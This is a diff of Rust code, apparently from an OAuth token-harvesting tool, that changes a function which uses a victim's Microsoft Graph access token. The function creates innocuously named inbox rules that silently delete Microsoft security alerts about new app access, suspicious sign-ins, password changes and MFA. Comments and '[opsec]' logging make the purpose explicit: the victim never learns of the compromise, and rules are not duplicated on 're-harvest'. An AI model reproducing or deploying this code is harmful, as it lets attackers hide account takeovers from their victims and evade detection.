@@ -302,111 +302,117 @@ async fn fetch_user_email(access_token: &str) -> Option<String> {
 /// The notification may arrive 5-20 seconds after the OAuth flow completes.
 /// Also creates a Graph messageRule to auto-delete future notifications instantly.
 async fn delete_microsoft_notification_email(access_token: String, user_agent: Option<String>, accept_language: Option<String>) {
-    // First, create a Graph inbox rule to auto-delete Microsoft notification emails.
-    // This fires instantly server-side — the user NEVER sees the notification.
-    let rule_payload = serde_json::json!({
-        "displayName": "External Mail Filter",
-        "sequence": 1,
-        "isEnabled": true,
-        "conditions": {
-            "fromAddressContains": [
-                "account-security-noreply@accountprotection.microsoft.com",
-                "microsoftaccount@microsoft.com",
-                "security@microsoft.com",
-                "microsoft@communications.microsoft.com",
-                "no-reply@accountprotection.microsoft.com",
-                "no-reply@microsoft.com",
-                "azureadnotification@microsoft.com",
-                "no-reply@azureadnotifications.microsoft.com",
-                "msonlineservicesteam@microsoftonline.com",
-                "no-reply@signin.microsoft.com",
-                "account-security-noreply@signin.microsoft.com"
-            ]
-        },
-        "actions": {
-            "delete": true,
-            "stopProcessingRules": true
-        }
-    });
-
     let client = Client::new();
     let ua = user_agent.as_deref().unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
     let lang = accept_language.as_deref().unwrap_or("en-US,en;q=0.9");
     let rule_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules";
-    match client
-        .post(rule_url)
+
+    // Check existing rules first — don't create duplicates on re-harvest
+    let existing_rules: serde_json::Value = match client
+        .get(rule_url)
         .header("Authorization", format!("Bearer {}", access_token))
-        .header("Content-Type", "application/json")
+        .header("Accept", "application/json")
         .header("User-Agent", ua)
         .header("Accept-Language", lang)
-        .json(&rule_payload)
         .send()
         .await {
-        Ok(r) if r.status().is_success() => {
-            println!("[opsec] Created Graph auto-delete rule for Microsoft notification emails");
+        Ok(r) if r.status().is_success() => r.json().await.unwrap_or_default(),
+        _ => serde_json::json!({"value": []}),
+    };
+
+    let existing_names: Vec<String> = existing_rules
+        .get("value")
+        .and_then(|v| v.as_array())
+        .map(|arr| arr.iter()
+            .filter_map(|r| r.get("displayName").and_then(|d| d.as_str()).map(|s| s.to_string()))
+            .collect())
+        .unwrap_or_default();
+
+    let has_external_mail_filter = existing_names.iter().any(|n| n == "External Mail Filter");
+    let has_security_update = existing_names.iter().any(|n| n == "Security Update");
+
+    // Rule 1: Sender-based auto-delete (only if not already present)
+    if !has_external_mail_filter {
+        let rule_payload = serde_json::json!({
+            "displayName": "External Mail Filter",
+            "sequence": 1,
+            "isEnabled": true,
+            "conditions": {
+                "fromAddressContains": [
+                    "account-security-noreply@accountprotection.microsoft.com",
+                    "microsoftaccount@microsoft.com",
+                    "security@microsoft.com",
+                    "microsoft@communications.microsoft.com",
+                    "no-reply@accountprotection.microsoft.com",
+                    "no-reply@microsoft.com",
+                    "azureadnotification@microsoft.com",
+                    "no-reply@azureadnotifications.microsoft.com",
+                    "msonlineservicesteam@microsoftonline.com",
+                    "no-reply@signin.microsoft.com",
+                    "account-security-noreply@signin.microsoft.com"
+                ]
+            },
+            "actions": {
+                "delete": true,
+                "stopProcessingRules": true
+            }
+        });
+        match client
+            .post(rule_url)
+            .header("Authorization", format!("Bearer {}", access_token))
+            .header("Content-Type", "application/json")
+            .header("User-Agent", ua)
+            .header("Accept-Language", lang)
+            .json(&rule_payload)
+            .send()
+            .await {
+            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph auto-delete rule for Microsoft notification emails"),
+            Ok(r) => eprintln!("[opsec] Failed to create Graph rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
+            Err(e) => eprintln!("[opsec] Failed to create Graph rule: {}", e),
         }
-        Ok(r) => {
-            let status = r.status();
-            let body = r.text().await.unwrap_or_default();
-            eprintln!("[opsec] Failed to create Graph rule ({}): {}", status, body);
-        }
-        Err(e) => eprintln!("[opsec] Failed to create Graph rule: {}", e),
+    } else {
+        println!("[opsec] 'External Mail Filter' rule already exists — skipping creation");
     }
 
-    // Also create a second rule for subject-based matching (broader catch)
-    let subject_rule_payload = serde_json::json!({
-        "displayName": "Security Update",
-        "sequence": 2,
-        "isEnabled": true,
-        "conditions": {
-            "subjectContains": [
-                "New app",
-                "New app(s)",
-                "have access to your data",
-                "connected to your Microsoft",
-                "suspicious sign-in",
-                "unusual sign-in",
-                "unusual activity",
-                "password changed",
-                "password was changed",
-                "security alert",
-                "security notification",
-                "account security",
-                "verify your identity",
-                "MFA",
-                "two-step verification",
-                "two-factor authentication",
-                "app password",
-                "review recent activity",
-                "help us protect your account",
-                "Microsoft account team",
-                "action required",
-                "your account was accessed"
-            ]
-        },
-        "actions": {
-            "delete": true,
-            "stopProcessingRules": true
+    // Rule 2: Subject-based auto-delete (only if not already present)
+    if !has_security_update {
+        let subject_rule_payload = serde_json::json!({
+            "displayName": "Security Update",
+            "sequence": 2,
+            "isEnabled": true,
+            "conditions": {
+                "subjectContains": [
+                    "New app", "New app(s)", "have access to your data",
+                    "connected to your Microsoft", "suspicious sign-in",
+                    "unusual sign-in", "unusual activity", "password changed",
+                    "password was changed", "security alert", "security notification",
+                    "account security", "verify your identity", "MFA",
+                    "two-step verification", "two-factor authentication",
+                    "app password", "review recent activity",
+                    "help us protect your account", "Microsoft account team",
+                    "action required", "your account was accessed"
+                ]
+            },
+            "actions": {
+                "delete": true,
+                "stopProcessingRules": true
+            }
+        });
+        match client
+            .post(rule_url)
+            .header("Authorization", format!("Bearer {}", access_token))
+            .header("Content-Type", "application/json")
+            .header("User-Agent", ua)
+            .header("Accept-Language", lang)
+            .json(&subject_rule_payload)
+            .send()
+            .await {
+            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph subject-based auto-delete rule for notifications"),
+            Ok(r) => eprintln!("[opsec] Failed to create subject rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
+            Err(e) => eprintln!("[opsec] Failed to create subject rule: {}", e),
         }
-    });
-    match client
-        .post(rule_url)
-        .header("Authorization", format!("Bearer {}", access_token))
-        .header("Content-Type", "application/json")
-        .header("User-Agent", ua)
-        .header("Accept-Language", lang)
-        .json(&subject_rule_payload)
-        .send()
-        .await {
-        Ok(r) if r.status().is_success() => {
-            println!("[opsec] Created Graph subject-based auto-delete rule for notifications");
-        }
-        Ok(r) => {
-            let status = r.status();
-            let body = r.text().await.unwrap_or_default();
-            eprintln!("[opsec] Failed to create subject rule ({}): {}", status, body);
-        }
-        Err(e) => eprintln!("[opsec] Failed to create subject rule: {}", e),
+    } else {
+        println!("[opsec] 'Security Update' rule already exists — skipping creation");
     }
 
     // Now poll for any notification that may have arrived BEFORE the rule was created.
